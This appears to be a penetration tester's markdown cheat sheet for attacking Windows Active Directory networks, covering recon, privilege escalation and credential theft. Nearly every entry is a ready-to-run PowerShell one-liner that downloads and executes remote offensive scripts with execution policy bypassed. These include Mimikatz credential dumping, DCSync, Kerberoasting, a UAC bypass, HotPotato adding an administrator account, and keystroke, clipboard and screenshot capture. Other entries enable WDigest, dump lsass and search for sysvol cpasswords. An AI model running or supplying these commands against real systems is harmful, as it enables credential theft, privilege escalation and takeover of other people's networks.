## Table of Contents

- [Domain Recon](#domain\recon)
  - [ShareFinder - Look for shares on network and check access under current user context & Log to file](#ShareFinder\-\Look\for\shares\on\network\and\check\access\under\current\user\context\&\Log\to\file)
  - [Import PowerView Module](#Import\PowerView\Module)
  - [Invoke-BloodHound for domain recon](#Invoke-BloodHound\for\domain\recon)
  - [ADRecon script to generate XLSX file of domain properties](#ADRecon\script\to\generate\XLSX\file\of\domain\properties)
- [Priv Esc](#priv\esc)
  - [PowerUp script](#PowerUp\script)
  - [cPasswords in sysvol](#cPasswords\in\sysvol)
  - [Inveigh](#Inveigh)
    - [Start inveigh using Basic Auth - logging to file](#Start\inveigh\using\Basic\Auth\-\logging\to\file)
    - [Start inveigh in silent mode (no popups)](#Start\inveigh\in\silent\mode\(no\popups))
  - [Invoke-HotPotato Exploit](#Invoke-HotPotato\Exploit)
  - [Bypass UAC and launch PowerShell window as admin](#Bypass\UAC\and\launch\PowerShell\window\as\admin)
  - [Invoke-Kerberoast with Hashcat Output](#Invoke-Kerberoast\with\Hashcat\Output)
- [Reg Keys](#reg\keys)
  - [Enable Wdigest](#Enable\Wdigest)
  - [Check always install elevated](#Check\always\install\elevated)
- [Mimikatz](#mimikatz)
  - [Invoke Mimikatz](#Invoke\Mimikatz)
  - [Import Mimikatz Module](#Import\Mimikatz\Module)
  - [Perform DcSync attack](#Perform\DcSync\attack)
  - [Invoke-MassMimikatz](#Invoke-MassMimikatz)
  - [Manual Procdump for offline mimikatz](#Manual\Procdump\for\offline\mimikatz)
- [Useful Scripts/Commands](#useful\scripts/commands)
  - [Use Windows Debug api to pause live processes](#Use\Windows\Debug\api\to\pause\live\processes)
  - [Import Powersploits invoke-keystrokes](#Import\Powersploits\invoke-keystrokes)
  - [Import Empire's Get-ClipboardContents](#Import\Empire's\Get-ClipboardContents)
  - [Import Get-TimedScreenshot](#Import\Get-TimedScreenshot)
- [Useful Links](#useful\links)
  - [Nmap](#Nmap)
  - [EyeWitness Binary](#EyeWitness\Binary)
  - [Sys InternalTools](#Sys\InternalTools)
  - [List of Binaries that can be used for living off the land techniques](#List\of\Binaries\that\can\be\used\for\living\off\the\land\techniques)
- [Installing CrackMapexec (Linux/Windows)](#installing\crackmapexec\(linux/windows))


#recon

```Powershell
# Domain Recon
## ShareFinder - Look for shares on network and check access under current user context & Log to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
```
## Import PowerView Module
```

powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
```
#powerview
## Invoke-BloodHound for domain recon
```

powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
```
#bloodhound
## ADRecon script to generate XLSX file of domain properties
```powershell

powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/sense-of-security/ADRecon/master/ADRecon.ps1')"
```
#ADRecon

# Priv Esc
## PowerUp script
```powershell

powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
```
#powerup

## cPasswords in sysvol
```powershell

findstr /S cpassword %logonserver%\sysvol\*.xml
findstr /S cpassword $env:logonserver\sysvol\*.xml
```
#sysvol #findstr #cpassword



## Inveigh
#inveigh #windows #AD
### Start inveigh using Basic Auth - logging to file
```powershell

powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -HTTPAuth Basic"
```
### Start inveigh in silent mode (no popups)
```powershell

powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y -WPADAuth anonymous"
```

#hotpotato
## Invoke-HotPotato Exploit
```powershell

powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Tater/master/Tater.ps1');invoke-Tater -Command 'net localgroup Administrators user /add'"
```

#UACBypass #powershell #admin
## Bypass UAC and launch PowerShell window as admin
```powershell

powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
```

#kerberoast
## Invoke-Kerberoast with Hashcat Output
```powershell

powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
```
	#hashcat
# Reg Keys
## Enable Wdigest
```python

reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 /f
```
#registry #keys
## Check always install elevated
```powershell

reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
registry query for HKEY)CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

#mimikatz
# Mimikatz
#dcsync #massmimikatz #powersploit #powerview #procdump
## Invoke Mimikatz
```powershell
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

## Import Mimikatz Module
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

## Perform DcSync attack
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:demodomain /user:sqladmin"'

## Invoke-MassMimikatz
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

## Manual Procdump for offline mimikatz
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp


# Useful Scripts/Commands
## Use Windows Debug api to pause live processes
powershell.exe -nop -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/Pause-Process/master/pause-process.ps1');Pause-Process -ID 1180;UnPause-Process -ID 1180;"

## Import Powersploits invoke-keystrokes
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')"

## Import Empire's Get-ClipboardContents
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1')"

## Import Get-TimedScreenshot
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/obscuresec/PowerShell/master/Get-TimedScreenshot')"


# Useful Links
## Nmap
https://nmap.org/dist/nmap-7.70-win32.zip

## EyeWitness Binary
https://www.christophertruncer.com/InstallMe/EyeWitness.zip

## Sys InternalTools
https://live.sysinternals.com/
https://download.sysinternals.com/files/SysinternalsSuite.zip

## List of Binaries that can be used for living off the land techniques
https://github.com/api0cradle/LOLBAS
```


#crackmapexec
# Installing CrackMapexec (Linux/Windows)
```bash
apt-get install -y libssl-dev libffi-dev python-dev-is-python3 build-essential

git clone https://github.com/mpgn/CrackMapExec

cd CrackMapExec

poetry install

poetry run crackmapexec
```




